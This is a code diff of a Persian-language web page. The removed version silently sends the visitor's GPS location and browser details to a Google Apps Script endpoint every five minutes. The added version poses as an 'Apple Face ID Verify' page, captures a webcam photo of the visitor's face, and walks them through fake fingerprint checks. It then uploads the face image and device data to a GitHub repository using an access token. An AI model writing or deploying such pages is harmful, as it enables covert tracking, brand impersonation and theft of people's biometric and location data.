@@ -1,57 +1,546 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="fa" dir="rtl">
+
 <head>
-  <meta charset="UTF-8">
-  <title>مکان‌یابی خودکار</title>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Apple Face ID Verify</title>
+
+<link rel="manifest" href="manifest.json">
+
+<meta name="theme-color" content="#000000">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:tahoma;
+}
+
+body{
+background:#000;
+color:#fff;
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+overflow:hidden;
+}
+
+.container{
+width:390px;
+max-width:95%;
+background:#0b0b0b;
+border-radius:35px;
+padding:25px;
+text-align:center;
+border:1px solid #222;
+box-shadow:0 0 40px rgba(0,170,255,.25);
+}
+
+.title{
+font-size:30px;
+font-weight:bold;
+margin-bottom:10px;
+}
+
+.desc{
+font-size:14px;
+color:#999;
+line-height:1.8;
+margin-bottom:25px;
+}
+
+.face-box{
+position:relative;
+width:260px;
+height:260px;
+margin:auto;
+border-radius:50%;
+overflow:hidden;
+border:4px solid #0af;
+box-shadow:
+0 0 25px #0af,
+inset 0 0 25px rgba(0,170,255,.4);
+}
+
+video{
+width:100%;
+height:100%;
+object-fit:cover;
+}
+
+.scan-line{
+position:absolute;
+width:100%;
+height:6px;
+background:#0af;
+box-shadow:0 0 25px #0af;
+animation:scan 3s linear infinite;
+}
+
+@keyframes scan{
+
+0%{
+top:0;
+}
+
+50%{
+top:250px;
+}
+
+100%{
+top:0;
+}
+
+}
+
+.status{
+margin-top:20px;
+font-size:18px;
+font-weight:bold;
+color:#0af;
+min-height:40px;
+}
+
+button{
+margin-top:20px;
+width:100%;
+padding:16px;
+border:none;
+border-radius:18px;
+background:#0af;
+color:#000;
+font-size:18px;
+font-weight:bold;
+cursor:pointer;
+transition:.3s;
+}
+
+button:hover{
+transform:scale(1.02);
+}
+
+.hidden{
+display:none;
+}
+
+.fingers{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:12px;
+margin-top:20px;
+}
+
+.finger{
+background:#111;
+padding:18px;
+border-radius:18px;
+border:1px solid #333;
+cursor:pointer;
+transition:.3s;
+}
+
+.finger.done{
+background:#00cc88;
+color:#000;
+font-weight:bold;
+}
+
+.success{
+margin-top:20px;
+color:#00ff99;
+font-size:15px;
+}
+
+</style>
+
 </head>
+
 <body>
-  <h2>در حال دریافت موقعیت مکانی...</h2>
-  <p id="status">منتظر اجازه برای دریافت مکان...</p>
 
-  <script>
-    const endpoint = "https://script.google.com/macros/s/AKfycbxs1-UXAc_SdpeBHAF4-ZjaPNauDb2adLGQ_rHpqKbjVcAW07sENxLW2d5_2p-IdyOuPg/exec";
+<div class="container">
 
-    function sendLocation() {
-      if (!navigator.geolocation) {
-        document.getElementById("status").innerText = "مرورگر شما از مکان‌یابی پشتیبانی نمی‌کند.";
-        return;
-      }
+<div class="title">
+Face ID
+</div>
 
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          const data = {
-            lat: position.coords.latitude,
-            lng: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            ua: navigator.userAgent
-          };
+<div class="desc">
+صورت خود را داخل دایره قرار دهید
+</div>
 
-          fetch(endpoint, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-          })
-          .then(res => res.text())
-          .then(text => {
-            document.getElementById("status").innerText = مکان ارسال شد (${new Date().toLocaleTimeString()});
-          })
-          .catch(err => {
-            document.getElementById("status").innerText = "خطا در ارسال: " + err.message;
-          });
-        },
-        error => {
-          document.getElementById("status").innerText = "خطا در دریافت مکان: " + error.message;
-        },
-        { enableHighAccuracy: true }
-      );
-    }
+<div class="face-box">
 
-    // ارسال اولیه
-    sendLocation();
-    // ارسال خودکار هر ۵ دقیقه (300,000 میلی‌ثانیه)
-    setInterval(sendLocation, 300000);
-  </script>
+<video id="video" autoplay playsinline></video>
+
+<div class="scan-line"></div>
+
+</div>
+
+<div class="status" id="status">
+درحال آماده سازی...
+</div>
+
+<button id="captureBtn" class="hidden">
+ادامه
+</button>
+
+<div id="fingerSection" class="hidden">
+
+<div class="desc">
+اثر انگشت هر انگشت را تایید کنید
+</div>
+
+<div class="fingers">
+
+<div class="finger" data-name="شست راست">
+شست راست
+</div>
+
+<div class="finger" data-name="اشاره راست">
+اشاره راست
+</div>
+
+<div class="finger" data-name="وسط راست">
+وسط راست
+</div>
+
+<div class="finger" data-name="حلقه راست">
+حلقه راست
+</div>
+
+<div class="finger" data-name="کوچک راست">
+کوچک راست
+</div>
+
+</div>
+
+<button id="finishBtn" class="hidden">
+COMPLETE
+</button>
+
+<div class="success" id="success"></div>
+
+</div>
+
+<canvas id="canvas" class="hidden"></canvas>
+
+</div>
+
+<script>
+
+if(localStorage.getItem("biometric_used")){
+
+document.body.innerHTML=`
+
+<div style="
+color:white;
+font-size:24px;
+text-align:center;
+padding:40px;
+">
+
+این احراز هویت قبلاً استفاده شده است
+
+</div>
+
+`;
+
+}
+
+const video=document.getElementById("video");
+
+const canvas=document.getElementById("canvas");
+
+const ctx=canvas.getContext("2d");
+
+const captureBtn=document.getElementById("captureBtn");
+
+const status=document.getElementById("status");
+
+let faceImage="";
+
+let fingerData=[];
+
+async function startCamera(){
+
+try{
+
+const stream=
+await navigator.mediaDevices.getUserMedia({
+
+video:{
+facingMode:"user"
+},
+
+audio:false
+
+});
+
+video.srcObject=stream;
+
+status.innerHTML="چهره شناسایی شد";
+
+setTimeout(()=>{
+
+captureBtn.classList.remove("hidden");
+
+},3000);
+
+}catch(e){
+
+status.innerHTML="اجازه دوربین داده نشد";
+
+}
+
+}
+
+startCamera();
+
+captureBtn.onclick=()=>{
+
+canvas.width=video.videoWidth;
+
+canvas.height=video.videoHeight;
+
+ctx.drawImage(video,0,0);
+
+faceImage=canvas.toDataURL("image/png");
+
+status.innerHTML="ثبت اثر انگشت";
+
+captureBtn.style.display="none";
+
+document.getElementById("fingerSection")
+.classList.remove("hidden");
+
+};
+
+async function verifyFingerprint(){
+
+if(!window.PublicKeyCredential){
+
+alert("مرورگر از اثر انگشت پشتیبانی نمی‌کند");
+
+return false;
+
+}
+
+try{
+
+const challenge=new Uint8Array(32);
+
+window.crypto.getRandomValues(challenge);
+
+await navigator.credentials.get({
+
+publicKey:{
+
+challenge:challenge,
+
+timeout:60000,
+
+userVerification:"required",
+
+rpId:window.location.hostname,
+
+allowCredentials:[]
+
+}
+
+});
+
+return true;
+
+}catch(err){
+
+return false;
+
+}
+
+}
+
+const fingers=document.querySelectorAll(".finger");
+
+fingers.forEach(f=>{
+
+f.onclick=async()=>{
+
+if(f.classList.contains("done")) return;
+
+status.innerHTML=
+"لطفاً اثر انگشت گوشی را وارد کنید";
+
+const ok=await verifyFingerprint();
+
+if(ok){
+
+f.classList.add("done");
+
+f.innerHTML="✓ ثبت شد";
+
+fingerData.push({
+
+finger:f.dataset.name,
+
+verified:true,
+
+time:new Date()
+
+});
+
+status.innerHTML=
+"اثر انگشت تایید شد";
+
+}else{
+
+alert("اثر انگشت تایید نشد");
+
+}
+
+if(fingerData.length===5){
+
+document.getElementById("finishBtn")
+.classList.remove("hidden");
+
+}
+
+};
+
+});
+
+document.getElementById("finishBtn")
+.onclick=async()=>{
+
+const data={
+
+verified:true,
+
+createdAt:new Date(),
+
+faceImage:faceImage,
+
+fingerprints:fingerData,
+
+device:navigator.userAgent
+
+};
+
+localStorage.setItem(
+"biometric_used",
+"true"
+);
+
+document.getElementById("success")
+.innerHTML=
+"احراز هویت تکمیل شد";
+
+downloadJSON(data);
+
+await uploadToGitHub(data);
+
+};
+
+function downloadJSON(data){
+
+const blob=new Blob(
+
+[JSON.stringify(data,null,2)],
+
+{type:"application/json"}
+
+);
+
+const a=document.createElement("a");
+
+a.href=URL.createObjectURL(blob);
+
+a.download="biometric.json";
+
+a.click();
+
+}
+
+async function uploadToGitHub(data){
+
+/*
+
+مهم:
+
+1- در GitHub توکن بساز
+2- ریپو ایجاد کن
+3- مقدارهای پایین را تغییر بده
+
+*/
+
+const token="YOUR_GITHUB_TOKEN";
+
+const repo="USERNAME/REPOSITORY";
+
+const path="data/biometric.json";
+
+const content=btoa(
+unescape(
+encodeURIComponent(
+JSON.stringify(data,null,2)
+)
+)
+);
+
+try{
+
+await fetch(
+
+`https://api.github.com/repos/${repo}/contents/${path}`,
+
+{
+
+method:"PUT",
+
+headers:{
+
+"Authorization":"token "+token,
+
+"Content-Type":"application/json"
+
+},
+
+body:JSON.stringify({
+
+message:"upload biometric",
+
+content:content
+
+})
+
+}
+
+);
+
+status.innerHTML=
+"فایل در GitHub ذخیره شد";
+
+}catch(e){
+
+status.innerHTML=
+"خطا در آپلود GitHub";
+
+}
+
+}
+
+if("serviceWorker" in navigator){
+
+navigator.serviceWorker.register("sw.js");
+
+}
+
+</script>
+
 </body>
+
 </html>
